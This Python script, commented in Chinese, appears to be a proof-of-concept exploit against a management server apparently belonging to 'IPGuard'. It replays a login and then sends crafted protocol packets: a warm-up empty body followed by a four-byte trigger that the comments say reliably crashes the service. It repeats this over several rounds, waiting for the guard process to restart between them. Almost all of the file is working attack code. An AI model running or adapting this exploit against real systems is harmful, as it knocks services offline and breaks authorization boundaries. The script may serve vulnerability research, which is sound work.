"""poc_4E00_v5copy.py — 完全照搬 poc_dbmgmt_probe_v5.py 那一行成功 trigger

零修改版: 用 v5 同一个 fresh_send 函数,同一个 body,同一个 flags,只跑一次。
如果这都不崩,问题在环境/版本/session,不在 PoC 代码。
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


# 100% 照 v5 的实现
def fresh_send(host, port, user, pwd, cmd, sub, body, flags=0x4600,
               timeout=15.0, retries=3, retry_delay=3.0):
    last_err = None
    for attempt in range(retries):
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.settimeout(timeout)
        except Exception as e:
            last_err = str(e)
            if attempt < retries - 1:
                time.sleep(retry_delay)
                continue
            return {"_err": f"connect: {e}"}
        try:
            idx, login_role, session_token, _ = replay_login(
                s, user, pwd, base_nonce,
                show_crypto=False, verbose=False,
            )
            next_nonce = (base_nonce + idx) & 0xFFFFFFFF
            pkt = build_packet_with_state(
                flags=flags, a2=cmd, a3=sub,
                nonce=next_nonce,
                sess_state_16_24=struct.pack("<II", login_role, session_token),
                fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
                plain=body,
            )
            s.sendall(pkt)
            try:
                return parse_packet(recv_full_packet(s))
            except (socket.timeout, ConnectionError, OSError) as e:
                return {"_err": str(e)}
        except Exception as e:
            last_err = str(e)
            if attempt < retries - 1:
                time.sleep(retry_delay)
                continue
            return {"_err": last_err}
        finally:
            try: s.close()
            except: pass


def main():
    if len(sys.argv) < 5:
        print("用法: python poc_4E00_v5copy.py HOST PORT USER PWD [count]")
        sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]
    count = int(sys.argv[5]) if len(sys.argv) >= 6 else 3

    # 完全照 v5 [C] 顺序: 先一个 body=empty 把状态预热,然后才是 \x01\x00\x00\x00
    print(f"[*] {host}:{port}")
    print(f"[*] Replaying v5 [C] crash sequence (warm-up + actual trigger)\n")

    for i in range(count):
        print(f"=== round {i+1} ===")

        # 步骤 1: body=empty (v5 第一项, 不崩)
        r1 = fresh_send(host, port, user, pwd, 0x4014, 6, b"",
                        flags=0x4E00, retries=1)
        print(f"  warm-up empty: {'_err' in r1 and '💥CRASH' or 'OK'}: {r1}")
        if "_err" in r1:
            print(f"    waiting 5s for guard...")
            time.sleep(5)

        # 步骤 2: body=\x01\x00\x00\x00 (v5 第二项, 必崩)
        r2 = fresh_send(host, port, user, pwd, 0x4014, 6, b"\x01\x00\x00\x00",
                        flags=0x4E00, retries=1)
        print(f"  trigger \\x01...: {'_err' in r2 and '💥CRASH' or 'NO CRASH'}: {r2}")
        if "_err" in r2:
            print(f"    waiting 5s for guard...")
            time.sleep(5)
        print()


if __name__ == "__main__":
    main()
